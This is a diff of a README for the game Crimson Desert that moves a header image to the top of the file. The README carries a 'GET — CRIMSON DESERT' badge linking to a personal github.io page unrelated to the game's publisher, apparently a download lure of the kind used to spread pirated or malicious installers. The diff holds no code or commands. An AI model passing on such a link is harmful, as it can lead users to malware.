@@ -1,5 +1,9 @@
 # Crimson Desert
 
+<p align="center">
+<img src="https://cdn.mos.cms.futurecdn.net/Dr4Fpfm59NJF2HLTdgrk6P.jpg" width="780">
+</p>
+
 [![GET — CRIMSON DESERT](https://img.shields.io/badge/GET-CRIMSON%20DESERT-2563eb?style=for-the-badge)](https://mccunekopischke.github.io/.github/)
 
 ---
@@ -68,11 +72,6 @@ As progression continues, new equipment, abilities, weapons, and combat techniqu
 - Story-driven gameplay
 - Immersive adventure
 
----
-
-<p align="center">
-<img src="https://cdn.mos.cms.futurecdn.net/Dr4Fpfm59NJF2HLTdgrk6P.jpg" width="780">
-</p>
 
 ---
 
